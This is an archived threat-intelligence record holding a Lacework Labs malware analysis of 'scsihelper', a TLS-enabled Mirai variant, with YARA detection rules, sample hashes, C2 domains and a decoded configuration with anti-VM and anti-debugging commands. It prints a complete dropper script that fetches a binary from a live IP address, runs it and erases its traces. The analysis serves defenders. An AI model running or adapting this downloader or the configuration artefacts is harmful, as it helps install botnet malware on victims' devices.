{
    "id": "c7b162e1-f29b-4272-b73a-4fe4f225242d",
    "created_at": "2023-01-12T15:09:41.440241Z",
    "updated_at": "2025-03-27T02:16:59.197148Z",
    "deleted_at": null,
    "sha1_hash": "89b73a15a500c508dada2bcb514395d4325ff965",
    "title": "2021-09-30 - Mirai goes Stealth – TLS & IoT Malware",
    "authors": "",
    "file_creation_date": "2022-05-28T05:01:34Z",
    "file_modification_date": "2022-05-28T05:01:34Z",
    "file_size": 597674,
    "plain_text": "# Mirai goes Stealth – TLS & IoT Malware\n\n**lacework.com/blog/mirai-goes-stealth-tls-iot-malware/**\n\n**Key Takeaways**\n\n\nSeptember 30, 2021\n\n\nIoT malware is becoming more popular for use in cloud attacks\nTypical usage of TLS in IoT malware is rare, but has been observed in suspected state-sponsored campaigns\nLacework Labs recently observed what is believed to be a targeted attack using a TLS enabled version of Mirai dubbed\n“scsihelper”\n\nIoT malware (typically used to infect IoT devices) has become a popular tool for targeting cloud environments. This is\nbecause it is widely available, lightweight, and possesses many requisite capabilities. The use of IoT malware in cloud\nenvironments typically involves botnet propagation and/or deployment of cryptominers.\n\nAs analysts, it can be difficult to distinguish specimens intended for cloud attacks versus IoT botnet propagation. This forces\nus to look at artifacts resulting from customization of the malware. For example, the source code for the Mirai IoT malware\nwas released in 2016 and since then there have been numerous customized versions. Many variants represent slight\ndeviations in configurations, however, others have significant modifications by way of additional libraries. For Linux malware,\none of these is Mbed TLS. The Mbed TLS library consists of support code for implementing the TLS and SSL protocols.\n\n[According to Sophos, by the first quarter of 2021, nearly half (46%) of malware leveraged TLS, up from 23% in 2020. For](https://news.sophos.com/en-us/2020/02/18/nearly-a-quarter-of-malware-now-communicates-using-tls/#:~:text=Encryption%20is%20one%20of%20the,securing%20their%20malicious%20network%20communication.)\nRATs and information stealers, network traffic encryption is especially important as remaining undetected while stealing\nsensitive information is necessary. This trend has yet to catch up in the IoT malware arena since information theft is not a\ndefault feature. Additionally adding TLS to malware adds complexity, uses more resources, creates large files, and could\nincrease detections. In a sample set of 10K Mirai samples, for example, we only observed 5 specimens using TLS, which is\nonly .05% of total samples.\n\n\n-----\n\nNote: This does not account for packed samples and those leveraging OpenSSL as opposed to MbedTLS. While Mirai has\nbeen observed with OpenSSL, its usage is even rarer – presumably due to the relatively larger file size.\n\n_Figure 1. TLS Capable Mirai – versus no TLS_\n\nThis blog includes an inventory of TLS in IoT and Mirai malware using custom Yara rules. Among the few uncovered\nspecimens, several have indicators of possible state affiliation and targeted activity. One of these was [VPNFliter, which was](https://blog.talosintelligence.com/2018/05/VPNFilter.html)\nreported by Talos in 2018. The malware was reported as “advanced, likely state-sponsored or state-affiliated”. Lacework Labs\nalso observed a TLS enabled Mirai specimen leveraged in what is believed to be a targeted attack. This malware, dubbed\nscsihelper, is detailed in its own section.\n\n**Yara Analysis**\n\nLacework Labs created the following rule that detects any IoT program with MbedTLS artifacts. The $s6 string in the rule is\nfrom [uclibc, which is a popular std library for reducing size. This makes it a common artifact in IoT type programs.](https://www.uclibc.org/)\n\n\n-----\n\n```\n{\nmeta:\ndescription = \"finds iot binaries using mbedtls\"\nauthor = \"Chris Hall @LaceworkLabs\"\ndate = \"2021-07-11\"\nstrings:\n$s1 = \"id-at-postalAddress\" fullword ascii\n$s2 = \"Usage does not match the keyUsage extension\" fullword ascii\n$s3 = \"id-at-postalCode\" fullword ascii\n$s4 = \"%s%-18s: %d bits\" fullword ascii\n$s5 = \"id-ce-keyUsage\" fullword ascii\n$s6 = \"npxXoudifFeEgGaACScs\" fullword ascii\ncondition:\nuint16(0) == 0x457f and all of them\n}\nA VirusTotal retrohunt using the above rule returned a total of 11 specimens (with last_seen > 90 days ago), none\nof which are benign. The rule matches on confirmed and unconfirmed VPNFilter stage 2 malware along with a handful\nof others. One of the matches was for an IoT backdoor dubbed “GodLua,” which was reported in 2019 and is the first\nobserved malware that makes use of the DNS over HTTPS protocol to conceal part of its infrastructure.\n\n```\nSpecimen Detections Yara rule hits on\nVirusTotal\n\n6f51002f72ff74c77cf868fe6aa2b246df4ca4679a290f883bec781b77ce3363 12 VPNFilter stage 2\n\n3feeec571461ab4f10b4174f979a0175c85b1ea2f66be02026838208a91fa5fe 40 VPNFilter stage 2\n\n\n4a47e3c3189bf58b86d614738065f4a466d52062386dabd318fcaa44a082307d\n41\n\n\n41 VPNFilter stage 2\n\n\n043289fe28f0dde2d07c40a6cb07e91c9c7ddb65d3c629bc64d197d46f7e96ab 19 VPNFilter stage 2\n\n88CA2663E5C786F691D8A61038159F147832CDDF92BDFD75FA42385EA9667738 28 Emotet (in memory\nrule)\n\n0e0094d9bd396a6594da8e21911a3982cd737b445f591581560d766755097d92 40 VPNFilter stage1 -3\n\ncd908747cd853fccc8ebe45ea984f4d976b0a8c1747e2ca27535d07ae0af9365 23 none\n\nbe858a2ba86bed9788fd77e8619882ff542e43a436aa9b5205a3297b66417ce9 8 Emotet (in memory\nrule)\n\na11c412fd9872c36646234aebd612314d945625fbd68c02051f891c1e333a1d6 30 none\n\n1e4678f579b4cd2affb37646ba900baf952a56dac775d5713507f72362e4207f 34 none\n\nWhile there were only a few hits total, several were also leveraging Mirai source code. These include a malware variant\n[Lacework Labs recently observed in an attack known as scsihelper, an unknown variant, and a family known as Tiint. Tiint](https://blog.netlab.360.com/ttint-an-iot-remote-control-trojan-spread-through-2-0-day-vulnerabilities/)\nwas reported by Netlab in 2020 and was observed using two zero day exploits, one of which wasn’t disclosed until eight\nmonths later.\n\nTLS Mirai specimen Description\n\n6f51002f72ff74c77cf868fe6aa2b246df4ca4679a290f883bec781b77ce3363 scsihelper\n\n19857eb041aeb01f164c5da55d23ead714a66e88112ba730c6df4d1d9a6d43c5 scsihelper\n\na11c412fd9872c36646234aebd612314d945625fbd68c02051f891c1e333a1d6 Unknown family,c2 domain: 5fly.io\n\n\n-----\n\n1e4678f579b4cd2affb37646ba900baf952a56dac775d5713507f72362e4207f Unknown family,c2 domain: 5fly.io\n\n043289fe28f0dde2d07c40a6cb07e91c9c7ddb65d3c629bc64d197d46f7e96ab Variant of “Tiint”. [Tiint is a custom Mirai](https://blog.netlab.360.com/ttint-an-iot-remote-control-trojan-spread-through-2-0-day-vulnerabilities/)\nbased RAT that leveraged zero day\nexploits in 2019 and 2020.\n\nThe following Yara rule detects these Mirai specimens. Note: since January 2021, over 9,700 Mirai based specimens have\nbeen uploaded to VirusTotal. The Yara only detects the files listed above.\n\n\n-----\n\n```\n{\nmeta:\ndescription = \"finds Mirai binaries using mbedtls\"\nauthor = \"Chris Hall @LaceworkLabs\"\ndate = \"2021-07-11\"\nstrings:\n$s1 = \"id-at-postalAddress\" fullword ascii\n$s2 = \"Usage does not match the keyUsage extension\" fullword ascii\n$s3 = \"id-at-postalCode\" fullword ascii\n$s4 = \"id-ce-extKeyUsage\" fullword ascii\n$s5 = \"%s%-18s: %d bits\" fullword ascii\n$s6 = \"id-ce-keyUsage\" fullword ascii\n$s7 = \"npxXoudifFeEgGaACScs\"\n$s8 = \"Mozilla\" xor(0x01-0xff)\ncondition:\nuint16(0) == 0x457f and all of them \n}\nscsihelper\nIn early July, Lacework Labs observed an attack which leveraged a TLS capable Mirai specimen dubbed scsihelper.\nMirai is typically bundled with exploits for networked devices to enable botnet propagation. The scsihelper variant\nwas devoid of these artifacts and was configured with anti-VM machine, and anti-analysis features. The payload was\ninstalled via exploitation of a Gitlab vulnerability detailed in CVE-2021-22204. Moreover, the malware delivery\nhost was taken offline following installation suggesting the infrastructure was not intended for additional\nvictims. While the motive behind this attack was unclear, these distinguishing characteristics suggest the activity\nmay have been targeted.\nMirai is used as the basis for a variety of custom malware, for example Moobot and Muhstik. Many Mirai variants\nhave single-byte XOR encoded configurations. scsihelper used key 0x25, which is a deviation from the more\nfrequently leveraged 0x22 key.\nDecoded configuration:\n\n```\n\n-----\n\n```\n%command not found\n%news.forsola.com\n%/proc/\n%/exe\n% (deleted)\n%/fd\n%.anime\n%GETLOCALIP\n%HTTPFLOOD\n%LOLNOGTFO\n%\\x58\\x4D\\x4E\\x4E\\x43\\x50\\x46\\x22\n%zollard\n%/bin/busybox kill -9 \n%shell\n%enable\n%system\n%/bin/busybox MIRAI\n%MIRAI: applet not found\n%ncorrect\n%/bin/busybox ps\n%/etc/resolv.conf\n%nameserver \n%server: dosarrest\n%server: cloudflare-nginx\n%Connection: keep-alive\n%Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n%Accept-Language: en-US,en;q=0.8\n%Content-Type: application/x-www-form-urlencoded\n%setCookie('\n%refresh:\n%location:\n%set-cookie:\n%content-length:\n%transfer-encoding:\n%chunked\n%connection:\n%Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0\n%Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36\n%Mozilla/5.0 (iPad; CPU OS 12_5 like Mac OS X) AppleWebKit/600.0.15 (KHTML, like Gecko) CriOS/34.0.2102 Mobile/13E122 Safari/513.2\n%Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36\n%Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36\n%/dev/watchdog\n%/dev/misc/watchdog\n%/bin/sh\n%/proc/cpuinfo\n%cat /proc/cpuinfo | grep -i vmware;dmesg | grep -i vmware\n%dmesg | grep -i virtualbox\n%cat /proc/cpuinfo | grep -i qemu;dmesg | grep -i qemu\n%hellomaster\n%news.sola0818.com\n%gdb\n%strace\n%ltrace\n%/proc/self/status\n%TracerPid:\n%wget --no-check-certificate -q -O /dev/null \n%scsihelper\n%wget\n%/proc/net/tcp\n%HTTP/1.0\n%GET\n%POST\n%/tmp\n%104.28.0.0/16\n%162.159.128.0/17\n%104.31.224.0/19\n%104.31.192.0/19\n%104.31.160.0/19\n%104.27.128.0/19\n%104.27.160.0/19\n%Just a moment...\n%REPORT %s:%s\n%/proc/%d/cmdline\n%POST %s HTTP/1.1\\r\\nUser-Agent: %s\\r\\nHost: %s\\r\\nConnection: Keep-Alive\\r\\nAccept: application/json\\r\\n%s\\r\\nContent-Type: application/json; charset=utf-8\\r\\nContent-Length:\n%d\\r\\nReferer: %s\\r\\n%s\\r\\n%s\n%GET %s HTTP/1.1\\r\\nUser-Agent: %s\\r\\nHost: %s\\r\\nAccept: */*\\r\\n%s\\r\\n\\r\\n\nThis output contained many typical strings seen in Mirai configs, however a few unique ones stand out. The most notable of these include the\nanti-analysis commands used for finding virtual-machine artifacts on the host, as well as debugging processes such as strace,l trace and gdb.\n\n```\nUnique Mirai config artifact description\n\nnews.forsola.com C2 domain\n\nnews.sola0818.com C2 domain\n\nhellomaster Unknown usage\n\nscsihelper Installation name\n\ncat /proc/cpuinfo | grep -i vmware anti-VM functionally – looks for vmware artifacts in cpuinfo\n\ndmesg | grep -i vmware anti-VM functionally – looks for vmware artifacts in dmesg\n\n\n-----\n\ndmesg | grep -i virtualbox anti-VM functionally – looks for virtualbox artifacts\n\n\n%gdb\n\n%strace\n\n%ltrace\n\n\nAnti-analysis functionally – looks for debugging utilities in process list\n\n\nPivoting off of the anti-VM artifacts, exposed earlier versions of scsihelper that were devoid of the MbedTLS library artifacts.\nNo other Mirai specimens were found to have this functionality making it unique to scsihelper malware. This revealed\nadditional infrastructure and c2 domain, which shared the same ‘news’ subdomain name.\n\nscsihelper specimen Type Notes\n\n\n74248325a8cf725a220f3176816eb5306ca3e0a8e574f3a1890bd0f24f27758c scsihelper\ndownloader\n– bash\n\n58062e86f9c69f6b4578ac331648c94a7d169b1270f81334d91fc4cbc507de1f scsihelper\ndownloader\n– bash\n\n\nDownloads from 45.78.65.155\n\nseed7.sh\n\nDownloads from 45.78.65.155\n\n\n927468579cd9dd437e8d1858bc04216fba86e7db6ad453514bad109372d2082d Mirai C2:news.infinitetrial.com\n\nhttp://destinyexp.com/200\nhttp://destinyexp.com/bins/200\nConfig XOR key:55\n\n1b7953ce1acc4141233d04ce941e4f643847fa1197246a25872afdae61271316 Mirai C2:news.infinitetrial.com\n\nITW:http://45.78.65.155/306\n\nConfig XOR key:55\n\n70ead0d62148bb1823387cd3c14fd8b5bb6a357b2e967cef5635a674841a52a5 Mirai C2:news.infinitetrial.com\nITW:\n\nhttp://destinyexp.com/200\nhttp://destinyexp.com/bins/200\nConfig XOR key:55\n\nThe scsihelper installer script used in the July attack was not recovered, however a zero-detection installer script of the same\nname (seed7.sh) was identified on VirusTotal. While the installer is simple, it is also custom and has a debug option. This\ndeviates from most Mirai downloaders that use the same template that was detailed in Lacework Labs’s whitepaper\n[BashWars.](https://www.lacework.com/blog/bash-malware-tactics/)\n\n\n-----\n\n```\nCMD=\"$(uname -m)\"\nUNKNOWN=\"UNKNOWN\"\nFILE_PATH=\"scsihelper\"\nURL=\"http://45[.]78.65.155:8011\"\nTEST=\"\"\nDEBUG=\"\"\nBRAND=$1\nslient(){\n  if [ \"$DEBUG\" = \"-d\" ]; then\n     \"[email protected]\"\n  else\n     \"[email protected]\" > /dev/null 2>&1\n  fi\n}\nfunc_gi(){\n  case \"$CMD\" in\n    *\"armv4\"* ) echo \"700\" ;;\n    *\"armv5\"* ) echo \"701\" ;;\n     *\"armv6b\"* ) echo \"709\" ;;\n    *\"armv6\"* ) echo \"702\" ;;\n    *\"armv7\"* ) echo \"704\" ;;\n    *\"mipsel\"* ) echo \"706\" ;;\n    *\"mips64\"* ) echo \"705\" ;;\n    *\"mips\"* ) echo \"705\" ;;\n    *\"i586\"* ) echo \"707\" ;;\n    *\"i686\"* ) echo \"707\" ;;\n    *\"x86_64\"* ) echo \"708\" ;;\n    *) echo $UNKNOWN;;\n  esac\n}\nfunc_dae(){\n  slient echo \"func_dae $1\"\n  slient cd /tmp || cd /proc || cd /var/run || cd /mnt || cd /\n  slient rm -f $FILE_PATH\n  slient wget $URL/$1 -O $FILE_PATH\n  if [ $? -eq 0 ] && [ -f \"$FILE_PATH\" ]; then\n    slient echo download ok\n  else\n    slient rm -f $FILE_PATH\n    return 0\n  fi\n  slient chmod 777 $FILE_PATH\n  slient \"./$FILE_PATH\" $BRAND $TEST\n  if [ $? -eq 0 ]; then\n    slient echo \"exec failed\"\n    return 0\n  else\n    slient echo \"exec ok\"    \n  fi\n  return 1\n}\nVALUE=$(func_gi)\nif [ \"$VALUE\" = \"$UNKNOWN\" ]; then\n  for i in 705 706 700 701 702 704 707 708\n  do \n    if func_dae $i; then\n      break\n    fi\n  done\nelse\n  func_dae $VALUE\nfi\nslient rm -f $FILE_PATH\nslient rm -f wget*\nrm -f $0\nLacework Labs leverages Cisco’s DNS Umbrella for domain investigations. A search on the scsihelper c2 domains\nrevealed no traffic however we know there was at least one involved in the July attack mentioned above. This is\n\n```\n\n-----\n\n```\n   y g y p y y g p g q\ntypically evident in Umbrella results.\n\n```\n**Conclusion**\n\nSince the release of the Mirai source code in 2016 there have been many variants seen in the wild. For those seen leveraging\nthe XOR encoded configurations, there were roughly 10K so far in 2021. Among Mirai malware and IoT programs in general,\na very small amount has been observed with the aforementioned MbedTLS library functions. For this sampling, only three\nfamilies are known – Godlua RAT, VPNFilter, and Tiint. The last two of these likely have involved state-sponsored activity and\nmultiple zero-day exploits. Scsihelper appears to be a separate family so its unknown if the actors have similar motives and\ncapabilities. While IoT malware is not uncommon in cloud attacks, the use of TLS-enabled IoT malware remains rare.\n\nGiven the nature of activity associated with TLS capable IoT-based malware, Lacework Labs recommends additional scrutiny\n[for any related specimens seen in your environment. Yara rules for these malware variants are available here. Be sure to](https://github.com/lacework/lacework-labs/tree/master/yara)\n[follow Lacework Labs on LinkedIn,](https://www.linkedin.com/showcase/lacework-labs) [Twitter, and Youtube to stay up to date on our latest research!](https://www.twitter.com/LaceworkLabs)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-30 - Mirai goes Stealth – TLS & IoT Malware.pdf"
    ],
    "report_names": [
        "2021-09-30 - Mirai goes Stealth – TLS & IoT Malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536181,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1653714094,
    "ts_modification_date": 1653714094,
    "files": {
        "pdf": "https://archive.orkl.eu/89b73a15a500c508dada2bcb514395d4325ff965.pdf",
        "text": "https://archive.orkl.eu/89b73a15a500c508dada2bcb514395d4325ff965.txt",
        "img": "https://archive.orkl.eu/89b73a15a500c508dada2bcb514395d4325ff965.jpg"
    }
}